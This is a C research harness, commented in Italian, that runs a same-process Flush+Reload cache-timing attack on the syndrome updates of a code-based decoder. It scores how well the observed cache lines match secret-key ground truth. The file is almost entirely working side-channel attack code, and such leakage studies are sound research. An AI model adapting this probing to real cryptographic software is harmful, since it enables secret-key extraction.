/* attack_fr.c - Milestone 1: oracolo CACHE REALE via Flush+Reload sull'array
 * syndrome_bits[P], stesso processo (sincrono). Riproduce il trace.txt di
 * trace.c ma con timing di cache vero, e stampa su stderr l'accuratezza di
 * detection per-iterazione confrontando con la ground truth.
 *
 * Perche' F+R e non P+P: la sindrome e' acceduta V volte (sparsa); upc e'
 * acceduto migliaia di volte (denso). Un P+P sincrono sull'update sarebbe
 * sommerso dal traffico su upc. F+R monitora indirizzi specifici della sola
 * sindrome -> upc (range diverso) non la inquina.
 *
 * Build: come trace.c (vedi run_fr.sh). Output trace su stdout, score su stderr.
 * Env: THRESH (default 130) soglia cicli hit/miss; GRAN/LINE come trace.c.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <immintrin.h>
#include "harness.h"
#include "gf2x.h"
#include "upc.h"
#include "repr.h"

static inline uint64_t rdtsc(void){
   unsigned a,d; asm volatile("lfence\n\trdtsc\n\tlfence":"=a"(a),"=d"(d));
   return ((uint64_t)d<<32)|a;
}
static inline void cflush(volatile void*p){ asm volatile("clflush (%0)"::"r"(p):"memory"); }
static inline uint64_t reload(volatile void*p){
   uint64_t t0,t1; asm volatile("mfence");
   t0=rdtsc(); asm volatile("movq (%0), %%rax"::"r"(p):"rax"); t1=rdtsc();
   return t1-t0;
}

int main(int argc, char **argv)
{
   const char *truth = argc > 1 ? argv[1] : "truth.txt";
   unsigned seed = argc > 2 ? (unsigned)atoi(argv[2]) : 1;
   srand(seed);

   int set_gran = getenv("GRAN") && strcmp(getenv("GRAN"), "set") == 0;
   uint32_t line_bytes = 1, shift = 0;
   if (set_gran) {
      const char *g = getenv("LINE");
      line_bytes = g ? (uint32_t)atoi(g) : 64;
      uint32_t b = line_bytes; while (b > 1) { b >>= 1; shift++; }
   }
   uint32_t dom = (P + line_bytes - 1) / line_bytes;
   uint64_t thresh = getenv("THRESH") ? strtoull(getenv("THRESH"),0,10) : 130;

   /* --- setup identico a trace.c --- */
   static bfkey_t key; static instance_t in;
   key_generate(&key); instance_random(&in, &key);
   static ALIGNED uint8_t upc[PAD8(N0 * P)];
   static uint8_t syn[P];
   memset(upc, 0, sizeof upc);
   dense_to_u8(syn, in.s_dense, P);
   compute_upcs(upc, key.Htr_sparse, syn);
   __m256i v_H_sparse[N0][N_REGS_H];
   const __m256i lane_idx = _mm256_setr_epi32(0,1,2,3,4,5,6,7);
   for (int b=0;b<N0;b++) for (int r=0;r<N_REGS_H;r++){
      int rem = V - r*I32_IN_YMM;
      __m256i km = _mm256_cmpgt_epi32(_mm256_set1_epi32(rem), lane_idx);
      v_H_sparse[b][r] = _mm256_maskload_epi32((const int*)&key.H_sparse[b][r*I32_IN_YMM], km);
   }
   int hw = population_count(in.s_dense);
   static DIGIT e_out[N0 * NUM_DIGITS_GF2X_ELEMENT];
   memset(e_out, 0, sizeof e_out);

   printf("# D %u\n", dom);

   uint8_t *seen   = calloc(dom, 1);   /* ground truth linee toccate */
   uint8_t *probed = calloc(dom, 1);   /* detection via F+R */
   /* indirizzi delle linee monitorate: una ogni 'line_bytes' nella sindrome */
   long tp=0, fp=0, fn=0, iters=0;

   int iter = 0;
   while (iter < MAX_ITER && hw != 0) {
      POS col = argmax_u8_ct(upc);
      uint32_t b = col / P, pos = col % P;

      /* ground truth (come trace.c): quali linee toccera' la sindrome */
      for (int k=0;k<V;k++){
         uint32_t row = key.Htr_sparse[b][k] + pos; row -= (row>=P)?P:0;
         seen[row >> shift] = 1;
      }

      /* FLUSH delle linee monitorate della sindrome */
      for (uint32_t s=0; s<dom; s++) cflush(&syn[(size_t)s << shift]);
      asm volatile("mfence");

      /* VITTIMA: esegue l'update reale (tocca syn[row] per le V righe) */
      hw = update_syndrome_and_upcs(upc, key.Htr_sparse, v_H_sparse, col, syn, hw);

      /* RELOAD: quali linee sono tornate in cache = toccate dalla vittima */
      for (uint32_t s=0; s<dom; s++){
         uint64_t t = reload(&syn[(size_t)s << shift]);
         if (t < thresh) probed[s] = 1;
      }

      /* emetti il trace osservato (formato trace.c) + score vs ground truth */
      int first = 1;
      for (uint32_t s=0; s<dom; s++){
         if (probed[s]) { printf(first?"%u":" %u", s); first=0; }
         if (probed[s] &&  seen[s]) tp++;
         if (probed[s] && !seen[s]) fp++;
         if (!probed[s] && seen[s]) fn++;
         seen[s]=0; probed[s]=0;
      }
      printf("\n");
      iters++;

      gf2x_toggle_coeff(e_out + b*NUM_DIGITS_GF2X_ELEMENT, pos);
      iter++;
   }
   free(seen); free(probed);

   /* truth.txt identico a trace.c */
   FILE *f = fopen(truth, "w");
   fprintf(f, "P %d V %d N0 %d gran %s line %u iters %d\n",
           P, V, N0, set_gran?"set":"bit", line_bytes, iter);
   for (int b=0;b<N0;b++){
      for (int k=0;k<V;k++) fprintf(f, "%s%u", k?" ":"", key.Htr_sparse[b][k]);
      fprintf(f, "\n");
   }
   fclose(f);

   double prec = tp+fp? 100.0*tp/(tp+fp):0, rec = tp+fn? 100.0*tp/(tp+fn):0;
   fprintf(stderr,
      "F+R seed=%u gran=%s thresh=%lu iter=%d decode=%s\n"
      "detection: TP=%ld FP=%ld FN=%ld  precision=%.3f%% recall=%.3f%%\n",
      seed, set_gran?"set":"bit", thresh, iter, hw==0?"ok":"KO", tp,fp,fn,prec,rec);
   return 0;
}
